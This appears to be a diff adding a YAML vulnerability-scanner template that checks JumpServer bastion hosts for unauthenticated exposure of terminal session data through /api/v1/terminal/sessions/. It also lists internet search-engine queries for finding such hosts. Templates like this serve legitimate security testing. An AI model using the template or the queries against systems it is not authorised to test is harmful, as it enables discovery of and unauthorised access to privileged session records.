@@ -1,0 +1,30 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="JumpServer-堡垒机"
+    hunter-query: app.name=="JumpServer"
+    quake-query: app:"Jumpserver堡垒机"  
+    zoomeye-query: app:"飞致云堡垒机"
+    threatbook-query: app=Fit2Cloud-Jumpserver-堡垒机
+    cve: 
+    cnvd: 
+    
+name: poc-yaml-jumpserver-unleak
+transport: http
+set:
+  s0: randomInt(1000,9999)
+  s1: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /api/v1/terminal/sessions/
+      follow_redirects: false
+      body: |
+    expression: >-
+      response.status == 200 && response.body_string.contains("user") && response.body_string.contains("assert")
+
+expression: r0() 
